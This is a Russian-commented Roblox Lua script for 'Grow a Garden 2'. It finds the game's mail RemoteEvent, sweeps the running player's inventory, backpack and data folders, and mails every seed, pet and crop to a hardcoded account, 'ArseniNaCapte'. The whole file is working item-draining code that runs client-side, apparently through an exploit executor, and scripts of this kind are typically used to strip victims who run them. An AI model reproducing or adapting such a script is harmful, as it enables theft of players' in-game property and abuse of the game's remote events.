--[[
    Скрипт для игры "Grow a Garden 2"
    Отправляет все предметы (семена, питомцы, плоды) игроку ArseniNaCapte
    Версия: 2.0 (Full)
    Автор: Python123451234
--]]

-- ============================================
-- НАСТРОЙКИ (изменяй здесь)
-- ============================================
local TARGET_PLAYER = "ArseniNaCapte"  -- Имя получателя
local SEND_DELAY = 0.1                -- Задержка между отправками (сек)
local MAX_ATTEMPTS = 3                -- Попыток отправки при ошибке

-- ============================================
-- СЕРВИСЫ
-- ============================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- ============================================
-- ПОИСК MAIL REMOTEEVENT
-- ============================================
local MailRemote = nil

-- Список возможных путей (можно добавить свои)
local possiblePaths = {
    ReplicatedStorage:FindFirstChild("MailEvent"),
    ReplicatedStorage:FindFirstChild("MailRemote"),
    ReplicatedStorage:FindFirstChild("SendMail"),
    ReplicatedStorage:FindFirstChild("PostBox"),
    ReplicatedStorage:FindFirstChild("Remote") and ReplicatedStorage.Remote:FindFirstChild("Mail"),
    ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("MailEvent"),
    ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SendMail"),
    ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("Mail")
}

-- Ищем вручную
for _, path in ipairs(possiblePaths) do
    if path and path:IsA("RemoteEvent") then
        MailRemote = path
        print("[Mail] Найден RemoteEvent:", path:GetFullName())
        break
    end
end

-- Если не нашли, ищем по названию
if not MailRemote then
    for _, child in ipairs(ReplicatedStorage:GetChildren()) do
        if child:IsA("RemoteEvent") and string.match(child.Name:lower(), "mail") then
            MailRemote = child
            print("[Mail] Найден по имени:", child:GetFullName())
            break
        end
    end
end

-- Если всё равно не нашли — ошибка
if not MailRemote then
    warn("==================================================")
    warn("[ОШИБКА] RemoteEvent для почты НЕ НАЙДЕН!")
    warn("Проверь путь вручную и измени код:")
    warn("Пример: MailRemote = ReplicatedStorage:WaitForChild('Network'):WaitForChild('MailEvent')")
    warn("==================================================")
    return
end

-- ============================================
-- ФУНКЦИЯ ПОИСКА ИНВЕНТАРЯ
-- ============================================
local function FindInventoryItems()
    local items = {
        seeds = {},
        pets = {},
        crops = {},
        other = {}
    }
    
    print("[Инвентарь] Начинаю сканирование...")
    
    -- 1. Проверяем PlayerGui (UI)
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, child in ipairs(playerGui:GetDescendants()) do
            if child:IsA("ModuleScript") and string.match(child.Name:lower(), "inventory") then
                print("[Инвентарь] Найден модуль в PlayerGui:", child.Name)
                -- Можно попробовать вызвать функцию из модуля
                local success, data = pcall(function()
                    return require(child) 
                end)
                if success and type(data) == "table" then
                    -- Пытаемся извлечь предметы из таблицы
                    for key, value in pairs(data) do
                        if type(value) == "table" then
                            for _, item in pairs(value) do
                                if type(item) == "string" then
                                    local name = item:lower()
                                    if name:match("seed") then
                                        table.insert(items.seeds, item)
                                    elseif name:match("pet") then
                                        table.insert(items.pets, item)
                                    elseif name:match("fruit") or name:match("crop") or name:match("berry") then
                                        table.insert(items.crops, item)
                                    else
                                        table.insert(items.other, item)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- 2. Проверяем папку Data
    local dataFolder = LocalPlayer:FindFirstChild("Data")
    if dataFolder then
        local inventoryData = dataFolder:FindFirstChild("Inventory")
        if inventoryData then
            print("[Инвентарь] Найдена папка Inventory в Data")
            for _, child in ipairs(inventoryData:GetChildren()) do
                if child:IsA("StringValue") or child:IsA("NumberValue") or child:IsA("BoolValue") then
                    local name = child.Name
                    local lowerName = name:lower()
                    if lowerName:match("seed") then
                        table.insert(items.seeds, name)
                    elseif lowerName:match("pet") then
                        table.insert(items.pets, name)
                    elseif lowerName:match("fruit") or lowerName:match("crop") or lowerName:match("berry") then
                        table.insert(items.crops, name)
                    else
                        table.insert(items.other, name)
                    end
                end
            end
        end
    end
    
    -- 3. Проверяем Backpack
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        print("[Инвентарь] Проверяю Backpack...")
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") or item:IsA("HopperBin") then
                local name = item.Name
                local lowerName = name:lower()
                if lowerName:match("seed") then
                    table.insert(items.seeds, name)
                elseif lowerName:match("pet") then
                    table.insert(items.pets, name)
                elseif lowerName:match("fruit") or lowerName:match("crop") or lowerName:match("berry") then
                    table.insert(items.crops, name)
                else
                    table.insert(items.other, name)
                end
            end
        end
    end
    
    -- 4. Проверяем все дочерние объекты LocalPlayer
    print("[Инвентарь] Сканирую все объекты игрока...")
    for _, child in ipairs(LocalPlayer:GetChildren()) do
        if child:IsA("Folder") and string.match(child.Name:lower(), "inventory") then
            for _, item in ipairs(child:GetChildren()) do
                local name = item.Name
                local lowerName = name:lower()
                if lowerName:match("seed") then
                    table.insert(items.seeds, name)
                elseif lowerName:match("pet") then
                    table.insert(items.pets, name)
                elseif lowerName:match("fruit") or lowerName:match("crop") or lowerName:match("berry") then
                    table.insert(items.crops, name)
                else
                    table.insert(items.other, name)
                end
            end
        end
    end
    
    -- 5. Проверяем StarterGui (если есть доступ)
    local starterGui = game:FindFirstChild("StarterGui")
    if starterGui then
        for _, child in ipairs(starterGui:GetDescendants()) do
            if child:IsA("StringValue") and string.match(child.Name:lower(), "inventory") then
                local name = child.Name
                local lowerName = name:lower()
                if lowerName:match("seed") then
                    table.insert(items.seeds, name)
                elseif lowerName:match("pet") then
                    table.insert(items.pets, name)
                elseif lowerName:match("fruit") or lowerName:match("crop") or lowerName:match("berry") then
                    table.insert(items.crops, name)
                end
            end
        end
    end
    
    -- 6. Удаляем дубликаты
    local function RemoveDuplicates(tbl)
        local seen = {}
        local result = {}
        for _, v in ipairs(tbl) do
            if not seen[v] then
                seen[v] = true
                table.insert(result, v)
            end
        end
        return result
    end
    
    items.seeds = RemoveDuplicates(items.seeds)
    items.pets = RemoveDuplicates(items.pets)
    items.crops = RemoveDuplicates(items.crops)
    items.other = RemoveDuplicates(items.other)
    
    print("[Инвентарь] Найдено:")
    print("  - Семена:", #items.seeds)
    print("  - Питомцы:", #items.pets)
    print("  - Плоды/урожай:", #items.crops)
    print("  - Прочее:", #items.other)
    
    return items
end

-- ============================================
-- ФУНКЦИЯ ОТПРАВКИ ПОЧТЫ
-- ============================================
local function SendMail(itemName, itemType)
    if not MailRemote then
        warn("[Ошибка] MailRemote не найден!")
        return false
    end
    
    if not itemName or itemName == "" then
        warn("[Ошибка] Пустое имя предмета!")
        return false
    end
    
    -- Формируем аргументы (может отличаться в игре)
    -- Стандартные варианты:
    -- Вариант 1: (recipient, itemName, amount, itemType)
    -- Вариант 2: (recipient, itemName, itemType)
    -- Вариант 3: ({recipient = ..., item = ..., amount = ...})
    
    local args = {
        TARGET_PLAYER,
        itemName,
        1,
        itemType or "Item"
    }
    
    local success = false
    local lastError = ""
    
    for attempt = 1, MAX_ATTEMPTS do
        local ok, err = pcall(function()
            MailRemote:FireServer(unpack(args))
        end)
        
        if ok then
            success = true
            break
        else
            lastError = err
            task.wait(SEND_DELAY * 0.5)
        end
    end
    
    if success then
        print(string.format("[Отправка] ✓ %s (%s) -> %s", itemName, itemType, TARGET_PLAYER))
        return true
    else
        warn(string.format("[Ошибка] ✗ %s (%s) -> Ошибка: %s", itemName, itemType, lastError))
        return false
    end
end

-- ============================================
-- ГЛАВНАЯ ФУНКЦИЯ
-- ============================================
local function Main()
    print("==========================================")
    print("  GROW A GARDEN 2 - MASS MAIL SENDER")
    print("==========================================")
    print("[Статус] Цель:", TARGET_PLAYER)
    print("[Статус] Задержка:", SEND_DELAY, "сек")
    print("[Статус] MailRemote:", MailRemote and "Найден ✓" or "Не найден ✗")
    print("==========================================")
    
    if not MailRemote then
        return
    end
    
    -- Ищем предметы
    local inventory = FindInventoryItems()
    
    -- Собираем все в один список
    local allItems = {}
    for _, seed in ipairs(inventory.seeds) do
        table.insert(allItems, {name = seed, type = "Seed"})
    end
    for _, pet in ipairs(inventory.pets) do
        table.insert(allItems, {name = pet, type = "Pet"})
    end
    for _, crop in ipairs(inventory.crops) do
        table.insert(allItems, {name = crop, type = "Crop"})
    end
    for _, other in ipairs(inventory.other) do
        table.insert(allItems, {name = other, type = "Other"})
    end
    
    local totalItems = #allItems
    
    if totalItems == 0 then
        print("==========================================")
        print("[ВНИМАНИЕ] Предметы не найдены!")
        print("Возможные причины:")
        print("  1. У вас пустой инвентарь")
        print("  2. Структура хранения предметов изменилась")
        print("  3. Нужно добавить путь сканирования вручную")
        print("==========================================")
        return
    end
    
    print("[Статус] Всего предметов к отправке:", totalItems)
    print("==========================================")
    
    -- Отправляем с задержкой
    local sent = 0
    local failed = 0
    
    for i, item in ipairs(allItems) do
        local success = SendMail(item.name, item.type)
        if success then
            sent = sent + 1
        else
            failed = failed + 1
        end
        
        -- Прогресс
        if i % 5 == 0 or i == totalItems then
            print(string.format("[Прогресс] %d/%d (Отправлено: %d, Ошибок: %d)", 
                i, totalItems, sent, failed))
        end
        
        task.wait(SEND_DELAY)
    end
    
    -- Итог
    print("==========================================")
    print("[ЗАВЕРШЕНО]")
    print("  - Отправлено:", sent)
    print("  - Ошибок:", failed)
    print("  - Всего:", totalItems)
    print("  - Получатель:", TARGET_PLAYER)
    print("==========================================")
end

-- ============================================
-- ЗАПУСК
-- ============================================
-- Ждём загрузки игрока
if not LocalPlayer or not LocalPlayer:IsA("Player") then
    print("[Ожидание] Загрузка игрока...")
    LocalPlayer = Players.LocalPlayer or Players:WaitForChild("LocalPlayer")
end

-- Ждём ReplicatedStorage
if not ReplicatedStorage then
    print("[Ожидание] ReplicatedStorage...")
    ReplicatedStorage = game:WaitForChild("ReplicatedStorage")
end

-- Запускаем
task.wait(1)
Main()

-- Keep alive (чтобы скрипт не закрылся)
print("[Статус] Скрипт активен. Ожидание...")
while true do
    task.wait(60)
end
